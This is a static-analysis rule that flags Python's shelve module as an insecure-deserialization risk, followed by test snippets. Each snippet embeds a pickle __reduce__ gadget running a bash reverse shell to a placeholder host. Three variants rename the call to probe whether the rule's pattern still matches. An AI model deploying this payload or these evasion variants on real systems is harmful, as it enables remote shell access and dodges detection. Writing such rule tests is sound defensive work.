### Rule
``` yaml
rules:
  - id: avoid-shelve
    metadata:
      owasp:
        - A08:2017 - Insecure Deserialization
        - A08:2021 - Software and Data Integrity Failures
      cwe:
        - "CWE-502: Deserialization of Untrusted Data"
      references:
        - https://docs.python.org/3/library/pickle.html
      category: security
      technology:
        - python
      cwe2022-top25: true
      cwe2021-top25: true
      subcategory:
        - audit
      likelihood: LOW
      impact: MEDIUM
      confidence: MEDIUM
      license: Commons Clause License Condition v1.0[LGPL-2.1-only]
      vulnerability_class:
        - "Insecure Deserialization "
    languages:
      - python
    message: Avoid using `shelve`, which uses `pickle`, which is known to lead to
      code execution vulnerabilities. When unpickling, the serialized data could
      be manipulated to run arbitrary code. Instead, consider serializing the
      relevant data as JSON or a similar text-based serialization format.
    severity: WARNING
    pattern: shelve.$FUNC(...)
````
### Code Snippet
```python
import shelve

class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )

# ruleid: avoid-shelve
myShelve = shelve.open(Shell_code())
```
### Transformation 1*
```python
import shelve

class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )

# ruleid: avoid-shelve
myfunc = shelve.open
myShelve = myfunc(Shell_code())
```
### Transformation 2
```python
import shelve

class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )

open_method = getattr(shelve, 'open')
myShelve = open_method(Shell_code())
```
### Transformation 3
```python
import shelve

class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )

methods = {"open": shelve.open}
myShelve = methods["open"](Shell_code())
```

